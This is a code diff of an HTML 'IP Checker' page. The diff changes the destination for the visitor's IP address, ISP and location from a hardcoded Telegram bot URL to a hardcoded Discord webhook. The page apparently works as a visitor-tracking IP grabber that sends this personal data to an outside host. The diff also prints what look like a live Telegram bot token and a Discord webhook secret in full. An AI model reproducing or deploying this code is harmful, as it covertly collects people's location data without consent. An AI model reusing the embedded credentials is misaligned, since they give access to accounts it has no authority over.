@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Checker with Telegram Debug</title>
+    <title>IP Checker with Discord Debug</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-100 flex items-center justify-center h-screen">
@@ -43,25 +43,23 @@
                 debugLog(`ISP: ${isp}`);
                 debugLog(`Location: ${location}`);
 
-                // Ganti chat_id dengan Chat ID numerik yang benar
-                sendToTelegram(ip, isp, location, 'YOUR_CHAT_ID');
+                sendToDiscord(ip, isp, location);
             } catch (error) {
                 debugLog("Error fetching IP information: " + error.message);
             }
         }
 
-        async function sendToTelegram(ip, isp, location, chatId) {
-            const message = `IP: ${ip} ISP: ${isp} Location: ${location}`;
-            const telegramUrl = `https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage`;
+        async function sendToDiscord(ip, isp, location) {
+            const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}`;
+            const discordWebhookUrl = 'https://discord.com/api/webhooks/1247107833435258911/807oJEH8MIMSq9OS-MxFssEplKJiy-UVQb1hmtcy3DnYI_azgx5VVsRu2LWrW4nW8688';
 
             const payload = {
-                chat_id: chatId,
-                text: message
+                content: message
             };
 
             try {
-                debugLog("Sending message to Telegram: " + message);
-                const response = await fetch(telegramUrl, {
+                debugLog("Sending message to Discord: " + message);
+                const response = await fetch(discordWebhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -70,17 +68,16 @@
                 });
 
                 const result = await response.json();
+                debugLog("Discord API response status: " + response.status);
+                debugLog("Discord API response: " + JSON.stringify(result));
 
-                debugLog("Telegram API response status: " + response.status);
-                debugLog("Telegram API response: " + JSON.stringify(result));
-
-                if (!result.ok) {
-                    debugLog("Telegram API error: " + result.description);
+                if (!response.ok) {
+                    debugLog("Discord API error: " + result.message);
                 } else {
                     debugLog("Message sent successfully.");
                 }
             } catch (error) {
-                debugLog("Error sending message to Telegram: " + error.message);
+                debugLog("Error sending message to Discord: " + error.message);
             }
         }
 
